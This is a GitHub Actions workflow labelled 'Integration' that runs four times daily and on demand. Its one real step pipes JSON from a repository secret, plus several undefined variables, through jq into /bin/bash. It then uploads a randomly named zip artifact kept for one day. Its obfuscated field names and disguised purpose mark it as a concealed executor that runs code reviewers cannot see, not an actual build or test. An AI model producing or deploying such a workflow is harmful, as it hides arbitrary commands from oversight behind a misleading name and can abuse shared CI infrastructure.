name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '30 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          a0: ${{ secrets.a0 }}
        run: |
          printf '%s' "$a0" | jq -r .v40 | /bin/bash
          printf '%s' "$rub1" | jq -r .y1964 | /bin/bash
          echo $ppto416 | jq -r .ehgao8879 | /bin/bash
          printf '%s' "$s9196" | jq -r .sei17 | /bin/bash
          echo $h8 | jq -r .c60 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: y3IRlNlZ
          path: "*.zip"
          retention-days: 1
